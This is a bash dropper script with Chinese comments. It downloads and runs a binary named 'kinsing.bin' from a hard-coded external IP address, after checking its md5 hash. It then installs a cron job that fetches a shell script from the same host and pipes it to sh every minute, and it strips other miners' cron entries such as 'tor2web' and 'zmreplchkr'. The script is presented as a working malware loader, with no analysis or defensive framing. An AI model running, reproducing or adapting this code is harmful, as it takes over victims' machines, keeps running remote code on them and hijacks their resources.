#!/bin/bash

#下载文件目录
SRCDIR=/tmp
#FTP目录(待下载文件目录)
DESDIR=kinsing.bin
#IP
IP=120.24.205.158
#端口

#需要下载的文件为fileName
fileName="kinsing.bin"
download(){
wget  http://120.24.205.158/kinsing.bin -P $SRCDIR

}

download2() {
  if [ -x "$(command -v md5sum)" ]; then
    sum=$(md5sum $SRCDIR/kinsing.bin | awk '{ print $1 }')
    case $sum in
    86657200ab3581889602434d2ef019e2)
      echo "kinsing OK"
      ;;
    *)
      echo "kinsing wrong"
      download
      ;;
    esac
  else
    echo "No md5sum"
    download
  fi
}

download2
$SRCDIR/kinsing.bin

crontab -l | grep -e "120.24.205.158" | grep -v grep
if [ $? -eq 0 ]; then
  echo "cron good"
else
  (
    crontab -l 2>/dev/null
    echo "* * * * * $LDR http://120.24.205.158/d.sh | sh > /dev/null 2>&1"
  ) | crontab -
fi

crontab -l | sed '/update.sh/d' | crontab -
crontab -l | sed '/logo4/d' | crontab -
crontab -l | sed '/logo9/d' | crontab -
crontab -l | sed '/logo0/d' | crontab -
crontab -l | sed '/logo/d' | crontab -
crontab -l | sed '/tor2web/d' | crontab -
crontab -l | sed '/jpg/d' | crontab -
crontab -l | sed '/png/d' | crontab -
crontab -l | sed '/tmp/d' | crontab -
crontab -l | sed '/zmreplchkr/d' | crontab -
